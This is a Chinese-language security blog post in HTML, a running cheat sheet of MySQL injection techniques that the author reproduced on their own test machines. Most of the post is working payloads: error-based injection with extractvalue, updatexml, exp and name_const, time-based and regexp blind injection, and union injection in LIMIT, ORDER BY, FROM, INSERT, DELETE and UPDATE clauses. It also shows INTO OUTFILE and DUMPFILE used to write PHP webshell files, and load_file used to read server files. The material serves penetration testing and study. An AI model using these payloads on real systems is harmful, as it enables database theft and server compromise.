<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> MySQL Injection（持续更新） · Patrilic's blog</title><meta name="description" content="MySQL Injection（持续更新） - Patrilic"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/Avatar.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://patrilic.top/atom.xml" title="Patrilic's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/Online_Tools" target="_self" class="nav-list-link">ONLINE_TOOLS</a></li><li class="nav-list-item"><a href="/Friends" target="_self" class="nav-list-link">FRIENDS</a></li><li class="nav-list-item"><a href="/2019/04/01/Hello/" target="_self" class="nav-list-link">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">MySQL Injection（持续更新）</h1><div class="post-info">Apr 14, 2019</div><div class="post-content"><p>[toc]</p>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>总结一波MySQL下各式各样等注入技巧～<br><strong>Test Machine Configuration</strong></p>
<blockquote>
<p>OS：MacOS Mojave 10.14.2<br>MySQL: MySQL 5.7.19-log</p>
</blockquote>
<p>测试表结构：<br><img src="/MySQL Injection.resources/6C53ADB2-2CA5-439F-A4B9-11C003B795A0.png" alt="3dce7ef9e83548ddeb6643a6f075af4f"></p>
<h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>Emmmm，测试失败了<br>翻了一些文章，发现limit之后的analyse() 只适用于<strong>MySQL server version &lt;= 5.6.6</strong></p>
<p>遂使用 Windows7 x64 + MySQL 5.5.53<br><img src="/MySQL Injection.resources/D3196ADE-0044-4C92-B294-C0F04299F77A.png" alt="26ef60fa552b1e2a9df1c06c0632111b"></p>
<p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">LIMIT</span> &#123;$uid&#125;,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p>
<p>Limit 注入主要是因为后面有一个 PROCEDURE analyse() 存储过程</p>
<p>构造报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="/MySQL Injection.resources/2575E461-4D29-4818-9593-DCD0A35574D2.png" alt="c4033dbc4df97e555bdc39638d337f21"></p>
<p>因为5.5版本不能使用SELECT，所以只能获取一些配置信息等</p>
<p><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>测试语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid &#123;evil&#125;;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>Order by + 报错注入<br><img src="/MySQL Injection.resources/68811865-6608-492B-9EA9-618492DCC0D1.png" alt="69d7117a4def2cf4d7d50d4c44b6ae03"></li>
</ol>
<ol start="2">
<li><p>order by + 时间盲注<br><img src="/MySQL Injection.resources/7E50257D-D914-4605-B905-974ED4AFFDDC.png" alt="68c940c3c115e97f55fcc166249e6d0d"></p>
</li>
<li><p>order by + union查询<br><img src="/MySQL Injection.resources/9D8482A7-0738-4C2C-B4F3-071B8CA50E97.png" alt="8635b1761c56ebe9d5b6204f5581517d"></p>
</li>
</ol>
<p>此注入必须使用()包围SQL语句</p>
<ol start="4">
<li>order by + regexp 盲注<br><img src="/MySQL Injection.resources/B5D21FEE-C714-4CD3-846F-CBDA2AF2129A.png" alt="27b6b63f4a93c01d5f57ee0a75c7efea"></li>
</ol>
<p>这里解释一下语句<br>当正则未匹配到数据时候返回的结果是0 所以SQL语句相当于<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
<p>排序不变<br><img src="/MySQL Injection.resources/38FFA41A-A8DA-4AE5-ACB7-FD4E5A91F294.png" alt="5a9b7d8ee50c22ed35efa6fb7e90310d"><br><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()) regexp <span class="string">'^aaaaaa'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">3</span>))a);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid) <span class="keyword">union</span> (<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$<span class="keyword">Tables</span>&#125;;</span><br></pre></td></tr></table></figure></p>
<p>直接嵌套子查询<br><img src="/MySQL Injection.resources/3356D524-EEEE-41BB-A7F6-EA9F38B99273.png" alt="37de6926a8a87e69f143bc5f7597342e"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>版本限制： Version &lt;= 5.5.5<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> ^ <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)), <span class="string">'patrilic'</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'String'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>extractvalue(target file，xml path)</p>
</blockquote>
<p><img src="/MySQL Injection.resources/E0ADE9FD-0F0C-44E7-95D8-30330401643E.png" alt="53bb49c2016af886807088cd58c0709d"><br><img src="/MySQL Injection.resources/4D36E31A-C0BE-4B4C-9657-25BB4BC7E9DA.png" alt="0e204a12a24b48d87710e60dc9b7a104"></p>
<h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'String'</span>,(<span class="keyword">Select</span> <span class="keyword">user</span>()),<span class="string">'String'</span>));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>updatexml(Target file，xml path，updateinfo)</p>
</blockquote>
<p><img src="/MySQL Injection.resources/B4AE3D11-4B7E-4285-BFE2-A8DF61A86FCA.png" alt="0786dc9cffd391c4dc9aec2cad9bb334"><br><img src="/MySQL Injection.resources/1AAFC23E-4228-4028-82AB-35DA8054C11A.png" alt="b6cbf8fdd04c44eeaa03b702c00ed273"></p>
<h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/EA30D650-D0A6-4C03-A248-B3E78D259A1A.png" alt="a02097ebcc3c66a348903385c2e09abf"></p>
<blockquote>
<p>name_const(‘1’, 14)<br>局限性很大</p>
</blockquote>
<h2 id="整数溢出报错注入"><a href="#整数溢出报错注入" class="headerlink" title="整数溢出报错注入"></a>整数溢出报错注入</h2><p>略</p>
<h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (uid,username,<span class="keyword">password</span>,city) <span class="keyword">VALUES</span> (?,?,?,?);</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/9C09B58A-2162-4FCF-8988-D8996342E899.png" alt="450be8fc5d042aa1d074506f7d5a93b7"></p>
<p><img src="/MySQL Injection.resources/4F1A02FF-2B06-4DC8-A883-D1B403287A29.png" alt="f87586d1fd2bcc77a06870c63fd14f28"></p>
<h2 id="delect"><a href="#delect" class="headerlink" title="delect"></a>delect</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid=&#123;$uid&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/C12A30AB-E4A6-4FF2-A383-08C1F7C0398E.png" alt="fdf530943ba24e6ec996a845e0b939cb"></p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">password</span> = &#123;$<span class="keyword">password</span>&#125; <span class="keyword">Where</span> username = &#123;session.user&#125; <span class="keyword">and</span> uid = &#123;session.uid&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/97D8B22C-8B27-4254-9E8B-C288DA88E4FD.png" alt="dcae7f06664c4456708cfdd3159490e9"><br><img src="/MySQL Injection.resources/AA3C9BAB-6ACC-44F4-9FCE-E770566EEFF6.png" alt="84d8c329a9ee3222c4c075648707d4e5"></p>
<h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p>主要用途：写shell<br>要求：</p>
<ul>
<li>要求用户具有file权限</li>
<li>文件不能覆盖写入，所以文件必须为不存在</li>
<li>如果secure_file_priv非空，则写入文件的目录只能为对应目录下<blockquote>
<p>into outfile + UNION</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p><img src="/MySQL Injection.resources/99802F7E-613B-4F25-8942-026AECDBE222.png" alt="bbeb09b67630a772e19b3b26e4f90b79"></p>
<blockquote>
<p>into outfile + LINES TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/B0EEFE16-15A3-4E45-8DA7-616987B525AC.png" alt="0313b6aaee866dee9ee0cc785bc89e7b"></p>
<blockquote>
<p>into outfile + FIELDS TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span>  <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/2E99B9C7-7369-4853-9669-7C5D56934A8B.png" alt="922aaffeb4b239df59cf0ddbea8241a2"></p>
<blockquote>
<p>into outfile + LINES STARTING BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/1DE8F60F-049E-4760-8B5A-6CB07714C781.png" alt="07ad0be0a19833ec877e9c7d77f0e0bc"></p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>主要用途：读文件<br>要求：</p>
<ul>
<li>要求用户具有file权限</li>
<li>如果secure_file_priv非空，则只能读取对应目录下的文件<blockquote>
<p>load_file + UNION</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'Y:/123.php'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p><img src="/MySQL Injection.resources/72271A75-3061-4252-BE6A-8A25F2D836FF.png" alt="fda87515edd1a870031c33556799b653"></p>
<blockquote>
<p>load_file + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/123.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/DDB31E30-84C6-4631-A40C-6A827C57AD55.png" alt="3b346d668d3dab3c2296330ac5421acd"></p>
<blockquote>
<p>load_file + extractive<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid=<span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/1.php'</span>))),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/4372D4EB-AC68-4E4B-9CD7-A7B7C0577854.png" alt="d068cdb2be5e81cf8ee618282fc0bb8f"></p>
<blockquote>
<p>load_file + isnull + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">isnull</span>(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>存在文件 返回0<br>不存在文件 返回1<br><img src="/MySQL Injection.resources/01D4A547-30E3-465F-A87C-0EA99176FBDF.png" alt="d54a32ed2b31fc6fb134d7275f17eae8"></p>
<h2 id="Dumpfile"><a href="#Dumpfile" class="headerlink" title="Dumpfile"></a>Dumpfile</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'Hello world!'</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'Y:/world.php'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/9DCC84F2-4346-4F76-A753-2F7813A9DFE7.png" alt="c5c1ec183eb4aba323bedb95d56f2100"></p>
<h2 id="Case-When"><a href="#Case-When" class="headerlink" title="Case When"></a>Case When</h2><p><img src="/MySQL Injection.resources/QQ20190423-122637@2x.png" alt="QQ20190423-122637@2x.png"></p>
<h2 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h2><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p>
<p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p>
<h2 id="In"><a href="#In" class="headerlink" title="In"></a>In</h2><p><img src="/MySQL Injection.resources//QQ20190423-122422@2x.png" alt="QQ20190423-122422@2x.png"></p>
<h2 id="不知道列名的注入"><a href="#不知道列名的注入" class="headerlink" title="不知道列名的注入"></a>不知道列名的注入</h2><p>看原文比较好，直接复现一下<br><img src="/MySQL Injection.resources/1359C87C-0FD0-4CEC-94C2-C7FD53622F20.png" alt="292940479295c820fe09ee52cc66aa61"><br><img src="/MySQL Injection.resources/C5353C73-C707-450C-AB0E-BC841DCDA2C9.png" alt="aa99b8908afbca3697612a580cf940eb"><br><img src="/MySQL Injection.resources/36489756-1393-404C-B72F-64E08CBF6877.png" alt="9dbf0195c2217b9ae5bc52ca52e89fd6"><br><img src="/MySQL Injection.resources/6B13EF6C-92F9-4238-9A6D-D6BBC9DB2A8A.png" alt="232655760d9f318c95d8c69b68f1827f"></p>
<h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://www.lucifaer.com/2018/08/13/MySQLi%20Cookbook/" target="_blank" rel="noopener">MySQLi Cookbook</a><br><a href="https://www.cnblogs.com/lcamry/" target="_blank" rel="noopener">lcamry’s blog</a><br><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">报错注入邂逅load_file&amp;into outfile搭讪LINES</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">sqli-extracting-data-without-knowing-columns-name</a><br><a href="https://legacy.gitbook.com/book/wangyihang/sqli-labs/details" target="_blank" rel="noopener">wangyihang-sqli-labs-Script</a><br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">史上最水的MYSQL注入总结</a></p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/04/18/ADS 隐藏后门/" class="prev">上一篇</a><a href="/2019/04/03/bypassUAC_via_comhijacking/" class="next">下一篇</a></div><div class="copyright"><p>© 2019 <a href="http://patrilic.top">Patrilic</a>, powered by Apoll.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>